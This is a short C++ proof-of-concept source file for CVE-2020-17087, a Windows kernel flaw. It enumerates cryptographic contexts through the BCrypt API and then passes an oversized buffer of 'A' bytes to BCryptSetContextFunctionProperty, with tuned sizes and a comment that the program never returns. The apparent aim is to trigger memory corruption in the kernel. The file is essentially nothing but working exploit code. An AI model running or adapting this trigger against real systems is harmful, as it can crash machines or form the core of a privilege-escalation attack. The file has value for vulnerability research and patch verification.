// CVE-2020-17087.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <bcrypt.h>

#include <iostream>

#pragma comment(lib, "Bcrypt.lib")

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

int main()
{
    ULONG uSize = 0;
    //const int nMaliciousSize = 0x3500;
    //const int nMaliciousSize = 0x2aaa;
    //const int nMaliciousSize = 0x35a0; interesting
    const int nMaliciousSize = 0x3650;


    PCRYPT_CONTEXTS pccContexts = NULL;
    PCRYPT_CONTEXT_FUNCTIONS pcfContextFunctions = NULL;

    NTSTATUS Status = BCryptEnumContexts(CRYPT_LOCAL, &uSize, &pccContexts);
    if (NT_SUCCESS(Status))
    {
        Status = BCryptEnumContextFunctions(
            CRYPT_LOCAL,
            pccContexts->rgpszContexts[0],
            BCRYPT_CIPHER_INTERFACE,
            &uSize,
            &pcfContextFunctions
        );
        if (!NT_SUCCESS(Status))
        {
            if (pccContexts != NULL)
            {
                BCryptFreeBuffer(pccContexts);
            }
            std::wcerr << "[!] BCryptEnumContextFunctions: " << std::hex << Status << std::endl;
            return EXIT_FAILURE;
        }
    }
    else
    {
        std::wcerr << "[!] BCryptEnumContexts: " << std::hex << Status << std::endl;
        return EXIT_FAILURE;
    }

    PBYTE pbMaliciousBuffer = new BYTE[nMaliciousSize];
    RtlFillMemory(pbMaliciousBuffer, nMaliciousSize, 0x41);

    Status = BCryptSetContextFunctionProperty(
        CRYPT_LOCAL,
        pccContexts->rgpszContexts[0],
        BCRYPT_CIPHER_INTERFACE,
        pcfContextFunctions->rgpszFunctions[0],
        BCRYPT_ALGORITHM_NAME,
        nMaliciousSize,
        pbMaliciousBuffer
    );

    /// Will never get hit
    return EXIT_SUCCESS;
}

